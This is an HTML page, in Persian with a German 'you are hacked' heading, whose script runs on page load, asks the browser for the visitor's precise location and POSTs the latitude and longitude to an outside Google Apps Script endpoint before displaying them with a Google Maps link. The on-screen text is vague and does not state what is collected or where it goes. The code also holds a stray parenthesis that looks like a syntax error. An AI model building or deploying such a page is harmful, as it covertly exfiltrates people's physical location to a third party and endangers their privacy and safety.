<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Gehackt</title>
</head>

<body>

  <h2>Du bist gehackt(O'~'O)</h2>

  <p>
   صبر کن الان میگم بهت
  </p>

  <p id="result">در حال آماده‌سازی...</p>

  <hr>

  <p id="infoResult"></p>

  <script>
    const SCRIPT_URL =
      "https://script.google.com/macros/s/AKfycbyOkaPgf6DbIk9xnIpk_GyyE1fIDTxayLrJvztmbkALjXuBdCTvYwwPo9I6fZD_Q9uYeQ/exec";

    function getLocation() {
      const result = document.getElementById("result");

      if (!navigator.geolocation) {
        result.innerText =
          "مرورگر شما  پشتیبانی نمی‌کند.";
        return;
      }

      result.innerText = "در حال دریافت ...";

      navigator.geolocation.getCurrentPosition(
        function(position) {

          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

        

          result.innerText = "در حال انجام...";

          fetch(SCRIPT_URL, {
            method: "POST",
            headers: {
              "Content-Type": "text/plain;charset=utf-8"
            },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon
            })
          })
          .then(response => response.text())
          .then(data => {

            const now = new Date();
            const dateStr = now.toLocaleDateString("fa-IR");
            const timeStr = now.toLocaleTimeString("fa-IR");

            result.innerHTML =
              "<br><br>" +
              "عرض جغرافیایی: " + lat + "<br>" +
              "طول جغرافیایی: " + lon + "<br>" +
              "تاریخ: " + dateStr + "<br>" +
              "ساعت: " + timeStr + "<br><br>" +
              '<a target="_blank" href="https://www.google.com/maps?q=' +
              encodeURIComponent(lat + "," + lon) +
              '">' +
              "باز کردن موقعیت در Google Maps" +
              "</a>";

          })
          .catch(error => {

            console.error("خطا:", error);

            result.innerText =
              " ناموفق بود.";

          });
        },

        function(error) {

          switch (error.code) {

            case error.PERMISSION_DENIED:
              result.innerText =
                "دسترسی رد شد.";
              break;

            case error.POSITION_UNAVAILABLE:
              result.innerText =
                " در دسترس نیست.";
              break;

            case error.TIMEOUT:
              result.innerText =
                "دریافت بیش از حد طول کشید.";
              break;

            default:
              result.innerText =
                "خطای نامشخص در دریافت.";
          }
        },

        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    
    function showLocationInfo() {
      const infoResult = document.getElementById("infoResult");

      if (!navigator.geolocation) {
        infoResult.innerText =
          "مرورگر شما پشتیبانی نمی‌کند.";
        return;
      }

      infoResult.innerText = "در حال دریافت ...";

      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
const now = new Date();
          const dateStr = now.toLocaleDateString("fa-IR");
          const timeStr = now.toLocaleTimeString("fa-IR");

          infoResult.innerHTML =
            "عرض جغرافیایی: " + lat + "<br>" +
            "طول جغرافیایی: " + lon + "<br>" +
            "تاریخ: " + dateStr + "<br>" +
            "ساعت: " + timeStr;
        },

        function(error) {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              infoResult.innerText = "دسترسی به رد شد.";
              break;
            case error.POSITION_UNAVAILABLE:
              infoResult.innerText = " در دسترس نیست.";
              break;
            case error.TIMEOUT:
              infoResult.innerText = "دریافت بیش از حد طول کشید.";
              break;
            default:
              infoResult.innerText = "خطای نامشخص در دریافت .";
          }
        },

        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    )
          
          window.addEventListener("DOMContentLoaded", getLocation);
  </script>

</body>
</html>
